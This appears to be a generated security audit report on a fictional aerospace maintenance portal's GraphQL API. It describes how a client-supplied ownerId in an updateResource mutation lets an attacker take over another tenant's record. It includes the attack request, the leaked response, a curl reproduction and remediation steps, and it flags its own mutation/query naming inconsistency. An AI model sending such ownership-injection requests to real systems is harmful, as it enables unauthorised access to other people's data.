# Security Analysis Report
**System:** WingTech Maintenance Portal
**Domain:** Aerospace / Aviation Maintenance
**Example ID:** GQL-0276
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Insecure Design — Pattern 3.1 | Client-assumed authority on `updateResource` — attacker escalates ownership of aerospace maintenance records by supplying untrusted `ownerId` |

---

## Finding 1 — Insecure Design: Client-Assumed Authority via Mutation Input (Pattern 3.1)

### Summary
The GraphQL API at `https://api.wingtech-maintenance.example.com/graphql` exposes an `updateResource` mutation that accepts `ownerId` from the client without server-side authority verification. The design assumes the client will only provide IDs it legitimately owns (client-assumed authority). An attacker injects `ownerId: "attacker-09a1a735"` to take control of maintenance record `R-2276`. The server response reveals `other-user-09a1a735`'s data under the `getResource` key (see inconsistency note).

**Context.txt inconsistency (documented):** The HAR request uses `updateResource(id: "R-2276", input: {status: "approved", ownerId: "attacker-09a1a735"})` (mutation), while the HAR response returns data under the key `getResource` (read). These names conflict. Both are faithfully reproduced here.

**Note:** `x-request-id: req-09a1a735` is a server-assigned response header; it does not appear in the outgoing request.

**Pattern:** 3.1 — Client-assumed authority (Insecure Design)
**Affected endpoint:** `POST https://api.wingtech-maintenance.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack (mutation)**
```
POST https://api.wingtech-maintenance.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json

{"query":"query VulnerableOp { updateResource(id: \"R-2276\", input: {status: \"approved\", ownerId: \"attacker-09a1a735\"}) { resourceId status } }"}
```

**Response — Victim Aerospace Maintenance Record**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-a735",
      "ownerId": "other-user-09a1a735",
      "data": {
        "sensitiveField": "CONFIDENTIAL-09a1a735",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

### Steps to Reproduce
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST "https://api.wingtech-maintenance.example.com/graphql" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { updateResource(id: \"R-2276\", input: {status: \"approved\", ownerId: \"attacker-09a1a735\"}) { resourceId status } }"}'
# Vulnerable: tenantId: tenant-a735, sensitiveField: CONFIDENTIAL-09a1a735
# Secure: {"errors":[{"message":"Forbidden — client-supplied ownerId not accepted"}]}
```

### Remediation
1. Never accept `ownerId` or `tenantId` in writable mutation inputs — derive from JWT server-side.
2. Resolver must compare `object.tenantId` against JWT `tenantId` claim.
3. Re-design mutation input types to exclude ownership/identity fields.
